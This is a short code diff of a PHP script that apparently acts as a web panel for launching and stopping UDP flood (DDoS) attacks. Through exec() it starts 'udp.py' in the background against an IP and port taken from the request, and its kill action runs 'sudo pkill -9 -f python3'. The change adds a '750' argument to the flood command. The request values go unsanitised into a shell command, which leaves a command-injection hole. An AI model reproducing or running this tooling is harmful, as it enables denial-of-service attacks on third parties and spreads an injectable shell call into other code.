@@ -2,7 +2,6 @@
 if (isset($_GET['type']) && $_GET['type'] === 'l4') {
     if (isset($_GET['action']) && $_GET['action'] === 'kill') {
         exec('sudo pkill -9 -f python3', $output, $return_var);
-
         if ($return_var == 0) {
             echo "All DDoS Processes Killed Successfully";
         } else {
@@ -14,7 +13,7 @@ if (isset($_GET['type']) && $_GET['type'] === 'l4') {
         $thread = $_GET['thread'];
         $time = $_GET['time'];
 
-        $command = "nohup python3 udp.py $ip $port $thread $time > /dev/null 2>&1 &";
+        $command = "nohup python3 udp.py $ip $port $thread $time 750 > /dev/null 2>&1 &";
         exec($command, $output, $return_var);
 
         if ($return_var == 0) {
